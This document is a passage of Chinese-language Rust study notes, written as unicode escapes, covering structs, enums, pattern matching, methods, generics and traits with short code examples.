\u8bbf\u95ee\u7ed3\u6784\u4f53\u5b57\u6bb5\u76f4\u63a5\u4f7f\u7528 . \u5c31\u53ef\u4ee5\u3002\u4fee\u6539\u67d0\u4e00\u5b57\u6bb5\u9700\u8981\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mut\uff0c\u65e0\u6cd5\u5c06\u67d0\u4e00\u5b57\u6bb5\u5355\u72ec\u6807\u8bb0\u4e3a mut \u53e6\u5916\uff0c\u5728\u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u5f15\u7528\u7c7b\u578b\u9700\u8981\u7528\u5230\u751f\u547d\u5468\u671f \u7b80\u5316\u521b\u5efa \u00b6 fn build_user ( name : String , age : u32 ) -> User { User { name , // name: name \u7f29\u5199 age , // age: age \u7f29\u5199 email : String :: from ( \"\" ), } } \u5f53\u53c2\u6570\u540d\u548c\u5b57\u6bb5\u540d\u76f8\u540c\u7684\u65f6\u5019\u53ef\u4ee5\u7701\u7565\u6389\u5185\u5bb9 \u66f4\u65b0\u7ed3\u6784\u4f53 \u00b6 \u901a\u8fc7\u5df2\u6709\u7ed3\u6784\u4f53\u5b9e\u4f8b\u521b\u5efa\u65b0\u5b9e\u4f8b\uff1a let user2 = User { email : String :: from ( \"another@example.com\" ), .. user1 // \u5fc5\u987b\u5199\u5728\u540e\u9762 }; \u5c06 user1 \u9664\u4e86 email \u4e4b\u5916\u7684\u5b57\u6bb5 \u79fb\u52a8 \u5230 user2 \u4e2d\u3002\u56e0\u4e3a\u8fd9\u662f\u79fb\u52a8\uff0c\u6240\u4ee5\u53d1\u751f\u4e86\u6240\u6709\u6743\u7684\u8f6c\u79fb\uff0c\u5bfc\u81f4 user1.name \u540e\u9762\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u4f46\u56e0\u4e3a u32 \u5b9e\u73b0\u4e86 Copy trait\uff0c\u6240\u4ee5 user1.age \u4ecd\u53ef\u4ee5\u4f7f\u7528\u3002\u5e76\u4e14 user1.email \u6240\u6709\u6743\u5e76\u6ca1\u6709\u8f6c\u79fb\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528 \u5143\u7ec4\u7ed3\u6784\u4f53 \u00b6 \u53ef\u4ee5\u5b9a\u4e49\u50cf\u5143\u7ec4\u4e00\u6837\u6ca1\u6709\u5b57\u6bb5\u540d\u7684\u7ed3\u6784\u4f53\uff1a struct Point ( i32 , i32 , i32 ); let point = Point ( 0 , 0 , 0 ); \u5355\u5143\u7ed3\u6784\u4f53 \u00b6 \u50cf\u5355\u5143\u7c7b\u578b\u4e00\u6837\uff0c\u6ca1\u6709\u4efb\u4f55\u5b57\u6bb5\u548c\u5c5e\u6027\u7684\u7ed3\u6784\u4f53\u3002\u4f5c\u7528\u4e0a\u6765\u770b\u5c31\u662f\u4e0d\u5173\u5fc3\u6570\u636e\uff0c\u4f46\u5173\u5fc3\u884c\u4e3a\uff08\u540e\u9762 impl \u4e4b\u7c7b\u7684\uff09 struct UnitLikeStruct ; let a = UnitLikeStruct ; \u6253\u5370\u7ed3\u6784\u4f53 \u00b6 \u7ed3\u6784\u4f53\u4e0d\u80fd\u76f4\u63a5\u88ab\u653e\u5728 {} \u4e2d\u6253\u5370\uff0c\u56e0\u4e3a\u6ca1\u6709\u5b9e\u73b0 Display trait \u4e00\u79cd\u65b9\u4fbf\u7684\u8f93\u51fa\u65b9\u5f0f\u662f\u5229\u7528 #[derive(Debug)] \u6765\u81ea\u52a8\u5b9e\u73b0 Debug trait \u6765\u5229\u7528 {:?} \u683c\u5f0f\u5316\u6216 dbg! \u5b8f\u8fdb\u884c debug \u6253\u5370\uff1a #[derive(Debug)] struct Rectangle { width : u32 , height : u32 , } fn main () { let rect = Rectangle { width : 30 , height : 50 }; println! ( \"{:?}\" , rect ); dbg! ( rect ); // \u8f93\u51fa\u5230 stderr \u6d41\u4e2d } \u8f93\u51fa\u4e3a\uff1a Rectangle { width: 30, height: 50 } [src/main.rs:10] rect = Rectangle { width: 30, height: 50, } \u679a\u4e3e \u00b6 \u4f7f\u7528 enum \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u679a\u4e3e\u7c7b\u578b\uff0c\u7528 :: \u6765\u8bbf\u95ee\u6210\u5458\uff0c\u53ef\u4ee5\u5305\u542b\u503c\uff1a enum Message { Quit , Move { x : i32 , y : i32 }, Write ( String ), ChangeColor ( i32 , i32 , i32 ), } fn main () { let m1 = Message :: Quit ; let m2 = Message :: Move { x : 1 , y : 1 }; let m3 = Message :: ChangeColor ( 255 , 255 , 0 ); } Option \u00b6 \u7c7b\u4f3c Haskell \u4e2d\u7684 Maybe\uff0c\u5b9a\u4e49\u662f\uff1a enum Option < T > { Some ( T ), None , } \u4f7f\u7528\u65f6\u65e0\u9700\u6dfb\u52a0 Option:: \u524d\u7f00\uff0c\u63d0\u53d6\u503c\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d \u6570\u7ec4 \u00b6 rust \u4e2d\u6570\u7ec4\u957f\u5ea6\u56fa\u5b9a\uff0c\u5fc5\u987b\u6709\u76f8\u540c\u7c7b\u578b\uff0c\u5b58\u50a8\u7ebf\u6027\u6392\u5217\u5728\u6808\u4e0a\uff0c\u901f\u5ea6\u5feb \u4e00\u4e2a\u6570\u7ec4\u7684\u7c7b\u578b\u662f [ \u5143\u7d20\u7c7b\u578b ; \u5143\u7d20\u4e2a\u6570 ]\uff0c\u4f8b\u5982 [ i32 ; 5 ] \u8868\u793a\u5305\u542b 5 \u4e2a i32 \u7684\u6570\u7ec4 \u4f7f\u7528\u540c\u4e00\u4e2a\u91cd\u590d\u5143\u7d20\u521d\u59cb\u5316\u6570\u7ec4\uff0c\u4f8b let a = [ 3 ; 5 ] \u5373 a \u4e3a\u5305\u542b 5 \u4e2a 3 \u7684\u6570\u7ec4 \u7d22\u5f15\u4f7f\u7528 []\uff0c\u4e0e\u5176\u5b83\u8bed\u8a00\u76f8\u540c \u8d8a\u754c\u8bbf\u95ee\u4f1a\u89e6\u53d1 panic \u548c\u5b57\u7b26\u4e32\u4e00\u6837\u53ef\u4ee5\u521b\u5efa\u5207\u7247\u5f15\u7528 \u6d41\u7a0b\u63a7\u5236 \u00b6 \u5206\u652f \u00b6 if - else if - else \u7ed3\u6784 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7 if \u8bed\u53e5\u5757\u662f\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u8d4b\u503c \u5faa\u73af \u00b6 for \u5faa\u73af for ... in ... \u7ed3\u6784 in \u540e\u9762\u7684\u96c6\u5408\u4e00\u822c\u9700\u8981\u4f7f\u7528\u5f15\u7528\uff0c\u5426\u5219\u4f1a\u5c06\u6240\u6709\u6743\u79fb\u81f3 for \u5757\u5185\uff08\u5b9e\u73b0\u4e86 Copy trait \u7684\u9664\u5916\uff09 \u5faa\u73af\u4e2d\u4fee\u6539\u5143\u7d20\u7684\u8bdd\u4e00\u822c\u9700\u8981\u4f7f\u7528\u53ef\u53d8\u5f15\u7528 \u5e26\u7d22\u5f15\u5faa\u73af let a = [ 4 , 3 , 2 , 1 ]; for ( i , v ) in a . iter (). enumerate () { // ... } \u4ec5\u5faa\u73af\u591a\u5c11\u6b21\uff1a for _ in 0 .. 10 \u5faa\u73af 10 \u6b21 \u53ef\u4ee5\u4f7f\u7528 continue \u548c break \u63a7\u5236\u5faa\u73af while \u5faa\u73af \u6ca1\u4ec0\u4e48\u7279\u522b\u7684 loop \u5faa\u73af \u4e0d\u4f1a\u81ea\u52a8\u505c\u6b62\uff0c\u9700\u8981\u9760 break \u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528 break \u6765\u8fd4\u56de\u4e00\u4e2a\u503c let result = loop { cnt += 1 ; if cnt == 10 { break cnt * 2 ; } }; rust \u4e2d\u53ef\u4ee5\u4f7f\u7528 label \u6765\u6307\u5b9a\u591a\u91cd\u5faa\u73af\u4e2d break \u6216 continue \u54ea\u4e00\u5c42\u5faa\u73af\uff1a ' outer : for i in 0 .. 10 { println! ( \"Outer: #i = {}\" , i ); ' inner : for j in 0 .. 10 { println! ( \"Inner: #j = {}\" , j ); if j == i { continue 'outer ; } if i == 5 { break 'outer ; } if j != 0 { continue 'inner ; } println! ( \"...\" ); } } \u6a21\u5f0f\u5339\u914d \u00b6 rust \u4e2d\u6709\u5f88\u591a\u6a21\u5f0f\u5339\u914d\uff0c\u6bd4\u5982 let \u8bed\u53e5\u3001for \u5faa\u73af\u672c\u8eab\u5c31\u76f8\u5f53\u4e8e\u6a21\u5f0f\u5339\u914d\uff1a let ( x , y ) = ( 1 , 2 ); for ( index , value ) in v . iter (). enumerate () { /* ... */ } \u4ee5\u53ca\u51fd\u6570\u53c2\u6570\uff1a fn func ( & ( x , y ) : & ( i32 , i32 )) { // x \u548c y \u4f1a\u4ece\u8fd9\u4e00\u4e2a\u53c2\u6570\u4e2d\u5339\u914d\u51fa\u6765 } \u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e9b\u4e13\u95e8\u5229\u7528\u6a21\u5f0f\u5339\u914d\u7684\u8bed\u6cd5\uff1a match \u8bed\u53e5 \u00b6 \u7c7b\u4f3c python \u7684 match-case \u8bed\u53e5\uff0c\u4ee5\u53ca Haskell \u7684\u6a21\u5f0f\u5339\u914d\u4ee5\u53ca\u5b88\u536b\u8bed\u6cd5 match target { pattern1 => expression1 , pattern2 => { statements1 ; statements2 ; expression2 }, pattern3 | pattern4 => expression3 , _ => expression4 , } \u6574\u4e2a match \u8bed\u53e5\u5757\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f match \u5fc5\u987b\u7a77\u4e3e\u51fa\u6240\u6709\u6a21\u5f0f\uff0c\u672a\u5217\u51fa\u7684\u5269\u4f59\u90e8\u5206\u4f7f\u7528\u901a\u914d\u7b26 _ \u8868\u793a\u5176\u5b83\u6240\u6709\u53ef\u80fd\u6027 _ \u4e0d\u4f1a\u88ab\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\uff0c\u5176\u5339\u914d\u5230\u7684\u503c\u90fd\u4f1a\u88ab\u5ffd\u7565 match \u7684\u6bcf\u4e00\u4e2a\u5206\u652f\u90fd\u5fc5\u987b\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u4e14\u6240\u6709\u5206\u652f\u7684\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u7c7b\u578b\u9700\u8981\u76f8\u540c | \u8868\u793a\u6216\uff0c\u5373\u5339\u914d\u4e8c\u8005\u4e2d\u7684\u4e00\u4e2a\u5373\u53ef \u53ef\u4ee5\u5229\u7528\u6a21\u5f0f\u5339\u914d\u6765\u7ed1\u5b9a\u65b0\u53d8\u91cf \u5e8f\u5217\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u6a21\u5f0f\uff0c\u6bd4\u5982 x = 5 \u5c31\u53ef\u4ee5\u5339\u914d\u6a21\u5f0f 1..=5 \u53ef\u4ee5\u4f7f\u7528 .. \u6765\u5ffd\u7565\u5269\u4f59\u503c let origin = Point { x : 0 , y : 0 , z : 0 }; match origin { Point { x , .. } => println! ( \"x is {}\" , x ), } let numbers = ( 2 , 4 , 8 , 16 , 32 ); match numbers { ( first , .. , last ) => println! ( \"Some numbers: {}, {}\" , first , last ), } \u53ef\u4ee5\u5728\u6a21\u5f0f\u540e\u9762\u589e\u52a0\u989d\u5916\u7684 if \u6761\u4ef6\uff0c\u79f0\u4e3a\u5339\u914d\u5b88\u536b\uff08match guard\uff09 let num = Some ( 4 ); match num { Some ( x ) if x >= 0 & x < 5 => println! ( \"less than five: {}\" , x ), Some ( x ) => println! ( \"{}\" , x ), None => (), } \u5728\u6709 | \u7684\u60c5\u51b5\u4e0b\uff0cif \u8bed\u53e5\u7684\u6761\u4ef6\u4f1a\u4f5c\u7528\u4e8e\u6240\u6709\u7684\u6a21\u5f0f\uff0c\u800c\u4e0d\u662f\u6700\u540e\u4e00\u4e2a \u53ef\u4ee5\u4f7f\u7528 @ \u6765\u4e3a\u5b57\u6bb5\u7ed1\u5b9a\u53d8\u91cf\uff0c\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u91cc\u7b2c\u4e00\u4e2a\u5339\u914d\u53ef\u4ee5\u5199\u4e3a Some ( x @ 0 .. 5 ) Rust 1.53 \u65b0\u8bed\u6cd5\uff1a\u5982 num @ ( 1 | 2 ) => .. . \u5c06 1 \u6216 2 \u7ed1\u5b9a\u5230 num \u53d8\u91cf\u4e0a Rust 1.56 \u65b0\u8bed\u6cd5\uff1a\u548c Haskell \u4e2d @ \u7528\u6cd5\u7c7b\u4f3c\uff0c\u5728\u89e3\u6784\u7684\u540c\u65f6\u4fdd\u7559\u539f\u503c\uff0c\u5982 let p @ Point { x : px , y : py } = Point { x : 10 , y : 20 }; // p = Point {x: 10, y: 20}, px = 10, py = 20 if let / while let \u00b6 \u53ea\u9700\u8981\u5339\u914d\u4e00\u4e2a\u6a21\u5f0f\u3001\u5ffd\u7565\u5176\u5b83\u6a21\u5f0f\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 if let \u8bed\u53e5\u6765\u7b80\u5316\uff0c\u6bd4\u5982\u4e0b\u9762\u4ee3\u7801 let v = Some ( 1 ); match v { Some ( 1 ) => println! ( \"!\" ), _ => (), } \u53ef\u4ee5\u5199\u4e3a let v = Some ( 1 ); if let Some ( 1 ) = v { // \u662f\u4e00\u4e2a\u7b49\u53f7\uff0c\u4e0d\u662f\u53cc\u7b49\u53f7 println! ( \"!\" ); } \u4e0e\u4e4b\u76f8\u4f3c\u7684\u662f while let \u8bed\u53e5\uff0c\u53ea\u8981\u5339\u914d\u5c31\u4e00\u76f4\u8fdb\u884c\u5faa\u73af\uff0c\u4f8b\u5982\uff1a let mut stack = Vec :: new (); // ... while let Some ( top ) = stack . pop () { println! ( \"pop {}\" , top ); } matches! \u5b8f \u00b6 \u4ec5\u4ec5\u9700\u8981\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u548c\u4e00\u4e2a\u6a21\u5f0f\u5339\u914d\u7684\u8bdd\u53ef\u4ee5\u4f7f\u7528 matches! \u5b8f\uff1a matches! ( value , pattern ) \u5982\u679c\u5339\u914d\u5219\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false \u65b9\u6cd5 \u00b6 Rust \u4e2d\u4f7f\u7528 impl \u5757\u6765\u4e3a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f53\u4f5c\uff0cstruct \u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u5c5e\u6027\uff0cimpl \u5757\u4e2d\u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u65b9\u6cd5 impl StructName { fn new ( .. .) -> StructName { StructName { .. . } } fn method ( & self , .. .) -> .. . { .. . } } \u4e00\u4e2a\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a self \u7b49\uff0c\u8868\u793a\u81ea\u8eab\uff0c\u4e14\u670d\u4ece\u6240\u6709\u6743\u89c4\u5219 self\uff1a\u5c06\u8c03\u7528\u8005\u7684\u6240\u6709\u6743\u8f6c\u79fb\u5230\u65b9\u6cd5\u4e2d\uff0c\u5c11\u7528\uff08\u7c7b\u578b\u4e3a Self \uff0c\u8868\u793a\u7ed3\u6784\u4f53\u81ea\u8eab\u7c7b\u578b\uff09 &self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528\uff08\u5b9e\u9645\u4e0a\u662f self : & Self \u7684\u8bed\u6cd5\u7cd6\uff09 &mut self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528 \u65b9\u6cd5\u540d\u53ef\u4ee5\u4e0e\u5b57\u6bb5\u540d\u76f8\u540c\uff08\u4e00\u822c\u7528\u6765\u5b9e\u73b0 getter\uff09 rust \u4f1a\u4e3a &self \u7b49\u81ea\u52a8\u5f15\u7528\u4e0e\u89e3\u5f15\u7528 impl \u5757\u4e2d\u6ca1\u6709 self \u53c2\u6570\u7684\u51fd\u6570\u79f0\u4e3a\u5173\u8054\u51fd\u6570\uff08\u5982\u4e0a\u9762\u7684 new\uff09 \u4e0d\u80fd\u4f7f\u7528 . \u6765\u4ee5\u65b9\u6cd5\u7684\u5f62\u5f0f\u8c03\u7528 \u5e94\u8be5\u4f7f\u7528 :: \u6765\u8c03\u7528\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u8fd9\u4e2a\u7ed3\u6784\u4f53\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u51fd\u6570\uff09 new \u4e00\u822c\u7528\u6765\u4f5c\u4e3a\u6784\u9020\u5668\uff0c\u5373\u4ece\u53c2\u6570\u8fd4\u56de\u4e00\u4e2a\u7ed3\u6784\u4f53 \u53ef\u4ee5\u5728\u591a\u4e2a impl \u5757\u4e2d\u4e3a\u540c\u4e00\u4e2a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5 impl \u4e5f\u53ef\u4ee5\u4e3a\u679a\u4e3e\u7c7b\u578b\u5b9a\u4e49\u65b9\u6cd5 \u6cdb\u578b Generics \u00b6 fn add < T : std :: ops :: Add < Output = T >> ( a : T , b : T ) -> T { a + b // ^ \u4fdd\u8bc1\u53ef\u4ee5 T \u76f8\u52a0\u5e76\u5f97\u5230 T \u7c7b\u578b\u7684\u7ed3\u679c } < T > \u4e3a\u4e00\u4e2a\u51fd\u6570\u89c4\u5b9a\u4e00\u4e2a\u6cdb\u578b T\uff0c\u5192\u53f7\u540e\u9762\u63a5\u9700\u8981\u7684 trait \u6765\u6dfb\u52a0\u9650\u5236 \u53ef\u4ee5\u901a\u8bc6\u5b9a\u4e49\u591a\u4e2a\u6cdb\u578b\uff0c\u7528\u9017\u53f7\u9694\u5f00\u5373\u53ef \u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u7b49\u90fd\u53ef\u4ee5\u4f7f\u7528\u6cdb\u578b struct Point < T > { x : T , y : T , } impl < T > Point < T > { //... \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 T } enum Option < T > { Some ( T ), None , } \u53ef\u4ee5\u4e3a\u5e26\u6cdb\u578b\u7684\u7ed3\u6784\u4f53\u9488\u5bf9\u67d0\u4e00\u5177\u4f53\u7c7b\u578b\u5b9e\u73b0\u65b9\u6cd5\uff1a impl Point < f32 > { // only for Point<f32> } \u8c03\u7528\u6cdb\u578b\u51fd\u6570 struct SGen < T > ( T ); fn func < T > ( arg : SGen < T > ) { /* ... */ } fn main () { func ( SGen ( 'a' )); // \u9690\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char func :: < char > ( SGen ( 'a' )); // \u663e\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char } const \u6cdb\u578b\uff0c\u5b9a\u4e49\u4e00\u4e2a\u57fa\u4e8e\u503c\u7684\u6cdb\u578b\u53c2\u6570 fn func < T : .. ., const N : usize > ( arr : [ T ; N ]) { // ... } const \u6cdb\u578b\u53c2\u6570\u53ea\u80fd\u63a5\u53d7\u4e0d\u5e26\u5176\u5b83\u6cdb\u578b\u53c2\u6570\u7684\u5b9e\u53c2 \u7279\u5f81 Trait \u00b6 \u7279\u5f81\u7c7b\u4f3c\u4e8e python \u4e2d\u7684\u62bd\u8c61\u57fa\u7c7b\uff0c\u89c4\u5b9a\u4e00\u4e9b\u5fc5\u987b\u6709\u7684\u65b9\u6cd5\uff0c\u4f46\u5dee\u522b\u8fd8\u662f\u5f88\u5927 \u5b9a\u4e49 trait pub trait MyTrait { fn func1 ( & self ) -> .. .; // \u5206\u53f7\u7ed3\u5c3e\uff0c\u4e0d\u7528\u5199\u51fd\u6570\u5185\u5bb9 fn func2 ( & self ) -> .. . { .. . // \u63d0\u4f9b\u9ed8\u8ba4\u5b9e\u73b0 } } pub \u5173\u952e\u5b57\u4f7f\u4e4b\u53ef\u4ee5\u4ece\u5916\u90e8\u5bfc\u5165 trait \u5757\u4e2d\u5bf9\u4e8e\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\u53ef\u4ee5\u53ea\u5199\u7b7e\u540d\uff0c\u4e5f\u53ef\u4ee5\u5c06\u51fd\u6570\u5199\u5b8c\u6574\u6765\u63d0\u4f9b\u4e00\u4e2a\u9ed8\u8ba4\u5b9e\u73b0 \u4e3a\u7c7b\u578b\u5b9e\u73b0\u7279\u5f81 impl MyTrait for MyType { fn func1 ( & self ) -> .. . { .. . } } \u5b64\u513f\u89c4\u5219\uff1a\u4e3a A \u7c7b\u578b\u5b9e\u73b0\u7279\u5f81 T\uff0c\u5219 A \u548c T \u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\uff0c\u4f8b\u5982\u4e0d\u53ef\u4ee5\u4e3a\u6807\u51c6\u5e93\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0\u5176\u5b83\u6807\u51c6\u5e93\u4e2d\u7684\u7279\u5f81\u3002\u786e\u4fdd\u67d0\u4e00\u5e93\u4e2d\u7684\u4ee3\u7801\u4e0d\u4f1a\u88ab\u5728\u88ab\u4f7f\u7528\u7684\u65f6\u5019\u7834\u574f \u5982\u679c\u4e00\u4e2a\u7279\u5f81\u7684\u65b9\u6cd5\u90fd\u6709\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5219\u82b1\u62ec\u53f7\u5185\u53ef\u4ee5\u4e0d\u5199\u4efb\u4f55\u4e1c\u897f \u7279\u5f81\u7ea6\u675f \u53c2\u6570\u91cc\u76f4\u63a5\u5199\u7279\u5f81\u662f\u6cdb\u578b\u7684\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4ee5\u4e0b\u4e24\u884c\u4ee3\u7801\u6548\u679c\u4e00\u6837 pub fn func ( arg : & impl MyTrait ) {} pub fn func < T : MyTrait > ( arg : & T ) {} \u53c2\u6570\u91cc\u6709\u7279\u5f81\u65f6\u4e0d\u4f1a\u5f3a\u5236\u6240\u6709\u8fd9\u6837\u7684\u53c2\u6570\u4e3a\u540c\u4e00\u7c7b\u578b\uff0c\u6bd4\u5982\u4ee5\u4e0b\u4e09\u884c\u4ee3\u7801 1 \u548c 2 \u7b49\u4ef7\u3001\u548c 3 \u4e0d\u7b49\u4ef7 pub fn func ( a : & impl MyTrait , b : & impl MyTrait ) {} pub fn func < T : MyTrait , U : MyTrait > ( a : & T , b : & U ) {} pub fn func < T : MyTrait > ( a : & T , b : & T ) {} \u591a\u91cd\u7ea6\u675f pub fn func ( arg : & ( impl Trait1 + Trait2 )) {} pub fn func < T : Trait1 + Trait2 > ( arg : & T ) {} where \u7ea6\u675f pub fn func < T , U > ( t : & T , u : & U ) -> .. . where T : Trait1 + Trait2 + Trait3 , U : Trait4 + Trait5 + Trait6 {} \u51fd\u6570\u8fd4\u56de\u503c\u53ef\u4ee5\u53ea\u8bf4\u5b9e\u73b0\u4e86\u67d0\u4e2a\u7279\u5f81\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u660e\u786e\u89c4\u5b9a fn func () -> impl MyTrait {} derive \u53ef\u4ee5\u6d3e\u751f\u7279\u5f81\uff0c\u4f7f\u7528\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5982\u524d\u9762\u5199\u8fc7\u7684 #[derive(Debug)] Debug\u3001PartialEq\u3001Eq\u3001PartialOrd\u3001Ord\u3001Clone\u3001Copy\u3001Hash\u3001Default \u591a\u4e2a\u7684\u8bdd\u4e2d\u95f4\u9017\u53f7\u5206\u9694 \u8c03\u7528\u5b9e\u73b0\u4e86\u67d0\u4e00\u7279\u5f81\u7684\u7c7b\u578b\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u5148\u7528 use \u5c06\u7279\u5f81\u5f15\u5165 \u4f8b\u5b50 \u4e3a Point \u5b9e\u73b0\u52a0\u6cd5 use std :: ops :: Add ; #[derive(Debug)] struct Point < T : Add < T , Output = T >> { x : T , y : T , } impl < T : Add < T , Output = T >> Add for Point < T > { type Output = Point < T > ; // \u5173\u8054\u7c7b\u578b fn add ( self , p : Point < T > ) -> Point < T > { Point { x : self . x + p . x , y : self . y + p . y , } } } \u4e3a Point \u5b9e\u73b0\u683c\u5f0f\u5316\u8f93\u51fa use std :: fmt ; use std :: fmt :: Display ; impl Display for Point { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"({}, {})\" , self . x , self . y ) } } \u7279\u5f81\u5bf9\u8c61 \u00b6 \u6bd4\u5982\u4f7f\u7528\u4e00\u4e2a Vec \u6765\u5b58\u50a8\u5b9e\u73b0\u540c\u4e00\u4e2a\u7279\u5f81\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u7528\u5230\u7279\u5f81\u5bf9\u8c61\uff0c\u4f8b\u5982 Vec < Box < dyn MyTrait >> \u4f7f\u7528\u6cdb\u578b\u6765\u4ee3\u66ff\u7684\u8bdd\uff0cVec \u4e2d\u7684\u6240\u6709\u503c\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4 \u53ea\u80fd\u4f7f\u7528 & \u5f15\u7528\u6216\u8005\u4f7f\u7528 Box \u667a\u80fd\u6307\u9488\u6765\u521b\u5efa\u7279\u5f81\u5bf9\u8c61 &dyn MyTrait \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u7528 & \u501f\u7528 Box<dyn MyTrait> \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u901a\u8fc7 Box::new(...) \u6765\u57fa\u4e8e\u67d0\u4e2a\u503c\u521b\u5efa\u667a\u80fd\u6307\u9488 \u521b\u5efa\u7684\u65f6\u5019\u4e0d\u9700\u8981\u52a0 dyn \u4e0d\u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u8bdd\uff0c\u5927\u5c0f\u4f1a\u672a\u77e5\uff0c\u4f46 &dyn \u548c Box<dyn> \u5927\u5c0f\u90fd\u5df2\u77e5 dyn \u4ee3\u8868\u52a8\u6001\u5206\u53d1\uff08dynamic dispatch\uff09 \u7279\u5f81\u5bf9\u8c61\u7684\u9650\u5236\uff1a\u53ea\u6709\u5bf9\u8c61\u5b89\u5168\u7684\u7279\u5f81\u624d\u80fd\u521b\u5efa\u7279\u5f81\u5bf9\u8c61 \u5bf9\u8c61\u5b89\u5168\uff1a \u65b9\u6cd5\u7684\u8fd4\u56de\u7c7b\u578b\u4e0d\u80fd\u662f Self \u65b9\u6cd5\u6ca1\u6709\u4efb\u4f55\u6cdb\u578b\u53c2\u6570 Clone \u7279\u5f81\u7684 clone \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f Self\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u5bf9\u8c61\u5b89\u5168\u7684\u3002 Box < dyn Clone > \u7684\u5199\u6cd5\u4f1a\u62a5\u9519 \u5173\u8054\u7c7b\u578b \u00b6 \u5173\u8054\u7c7b\u578b\u5b9a\u4e49 trait \u5757\u4e2d\uff0c\u53ef\u4ee5\u5728\u540e\u7eed\u7684\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8be5\u7c7b\u578b\u3002\u4f8b\u5982 Iterator \u7684\u5b9a\u4e49\uff1a pub trait Iterator { type Item ; fn next ( & mut self ) -> Option < Self :: Item > ; } \u8fd9\u79cd\u5199\u6cd5\u6bd4\u4e3a Iterator \u589e\u52a0\u4e00\u4e2a\u6cdb\u578b\u66f4\u6709\u53ef\u8bfb\u6027\uff0c\u800c\u4e14\u5199\u8d77\u6765\u4e5f\u7b80\u4fbf \u9ed8\u8ba4\u6cdb\u578b\u7c7b\u578b\u53c2\u6570 \u00b6 \u4f8b\u5982 Add \u8fd9\u4e2a trait\uff1a trait Add < RHS = Self > { type Output ; fn add ( self , rhs : RHS ) -> Self :: Output ; } Add \u7684 RHS \u6cdb\u578b\u53c2\u6570\u5e26\u6709\u4e00\u4e2a\u9ed8\u8ba4\u503c Self\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 impl \u7684\u65f6\u5019\uff0c\u5982\u679c\u4e0d\u4e3a Add \u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u9ed8\u8ba4 RHS \u662f Self\uff0c\u5373\u8981\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u548c\u88ab\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u4e00\u81f4\u3002\u4f8b\u5982\uff1a struct Point { x : i32 , y : i32 , } impl Add for Point { // \u9ed8\u8ba4\u5c31\u662f\u8981\u52a0 Point type Output = Point ; fn add ( self , other : Point ) -> Point { .. . } } \u540c\u540d\u65b9\u6cd5\u8c03\u7528 \u00b6 \u5f53\u4e00\u4e2a\u7c7b\u578b\u7684\u65b9\u6cd5\u4e0e\u5b83\u5b9e\u73b0\u7684 trait \u7684\u65b9\u6cd5\u540d\u91cd\u540d\u65f6\uff0c\u76f4\u63a5\u8c03\u7528\u4f1a\u8c03\u7528\u7c7b\u578b\u4e0a\u7684\u65b9\u6cd5\u3002\u60f3\u8981\u8c03\u7528 trait \u4e0a\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u4f7f\u7528 :: \u6765\u663e\u5f0f\u8c03\u7528\uff0c\u5982\uff1a trait A { fn func ( & self ); } 